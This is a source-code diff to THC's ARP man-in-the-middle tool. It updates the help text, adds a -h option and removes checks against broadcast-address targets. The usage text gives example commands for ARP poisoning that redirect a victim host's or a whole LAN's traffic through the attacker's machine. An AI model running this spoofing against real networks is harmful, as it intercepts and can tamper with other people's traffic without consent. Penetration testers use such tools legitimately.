@@ -244,13 +244,20 @@ str2ipmac(char *str, struct _ipmac *ipmac)
 void 
 usage(int code, char *string)
 {
-	fprintf(stderr, "ERROR: %s\n", string);
+	if (string != NULL)
+		fprintf(stderr, "ERROR: %s\n", string);
 	fprintf(stderr,
 "\n"
+"THC ARP Man-in-the-Middle ver "VERSION"\n"
+"https://www.thc.org\n"
+"\n"
 "Usage:\n"
-"arpmim [OPTION] <your mac> <targetip[:targetmac] <ip1[:mac1]> ...\n"
+"arpmim [OPTION] <your mac> <targetip:targetmac> <ip1:mac1> ...\n"
 "[Tell ip1, ip2, ... ipN that targetip has <your mac> and\n"
-" tell targetip that ip1, ip2, ... ipN has <your mac>]\n\n"
+" tell targetip that ip1, ip2, ... ipN has <your mac>]\n"
+"Normally 'targetip' is the default gw and the IPs following are the hosts\n"
+"you like to redirect to your mac/computer\n"
+"\n"
 "Options:\n"
 " -i <device>	: ethernet device [default=auto]\n"
 " -l <iprange>	: generate ip-list [73.50.0.0-73.50.31.255]\n"
@@ -261,24 +268,24 @@ usage(int code, char *string)
 " -a		: asymmetric\n"
 " -A		: reverse asymmetric\n"
 " -v		: verbose output [-vv..vv for more]\n"
-" -t <ip>	: AUTO MODE: Redirect target IP<->GW\n"
+" -t <ip>	: AUTO MODE: Redirect target IP<->GW (***NEW 2020***)\n"
 "\n"
-"Example (AUTO MODE):\n"
-"AUTO MODE: Redirect victim=10.0.1.2"
-"arpmitm -t 10.0.1.2"
+"Example (AUTO MODE) - For beginners:\n"
+"AUTO MODE: Redirect victim=10.0.1.111\n"
+"# arpmitm -t 10.0.1.111"
 "\n"
 "Examples:\n"
 "Classic (1:1, gate=10.0.1.254, victim=10.0.1.111):\n"
-"arpmim -v 00:02:13:37:73:50 10.0.1.254:11:11:22:22:33:33 \\\n"
-"                            10.0.1.111:44:44:55:55:66:66\n"
+"# arpmim -v 00:02:13:37:73:50 10.0.1.254:11:11:22:22:33:33 \\\n"
+"                              10.0.1.111:44:44:55:55:66:66\n"
 "\n"
-"Advanced (1:N, gate=10.0.1.254, asymmetric _only_):\n"
-"arpmim -A -v 00:02:13:37:73:50 255.255.255.255 10.0.1.254\n"
+"Advanced (1:N, gate=10.0.1.254, Use -a or -A (!)):\n"
+"# arpmim -A -v 00:02:13:37:73:50 255.255.255.255 10.0.1.254\n"
 "[tell *everyone* that 10.0.1.254 has 00:02:13:37:73:50]\n"
 "\n"
 "Elite (n:N):\n"
-"arpmim -A -v 00:02:13:37:73:50 255.255.255.255 10.0.0.1 10.0.0.2 10.0.0.3 \\\n"
-"                                               10.0.0.4 10.0.0.5 10.0.0.6\n"
+"# arpmim -A -v 00:02:13:37:73:50 255.255.255.255 10.0.0.1 10.0.0.2 10.0.0.3 \\\n"
+"                                                 10.0.0.4 10.0.0.5 10.0.0.6\n"
 "[tell 10.0.0.1,..10.0.0.6 that 10.0.0.1,..10.0.0.6 has 00:02:13:37:73:50]\n");
 	exit(code);
 }
@@ -322,10 +329,13 @@ do_opt(int argc, char *argv[])
 	extern int optind;
 	int c;
 
-	while ((c = getopt (argc, argv, "t:w:i:l:f:mrAav")) != -1)
+	while ((c = getopt (argc, argv, "t:w:i:l:f:mrAavh")) != -1)
 	{
 		switch (c)
 		{
+		case 'h':
+			usage(0, NULL);
+			break;
 		case 'r':
 			opt.arpop = ARPOP_REQUEST;
 			break;
@@ -618,10 +628,6 @@ main(int argc, char *argv[])
 			if (opt.getnextipmac(&ipmac) == -1)
 				ERREXIT("FATAL: No ip's???\n");
 		}
-		if (opt.trgt.ip == 4294967295)
-			ERREXIT("Target is 255...arg!\n");
-		if (ipmac.ip  == 4294967295)
-			ERREXIT("ipmac... is 255...arg!\n");
 
 		if (!(opt.flags & OPT_FL_REVASYM))
 		{
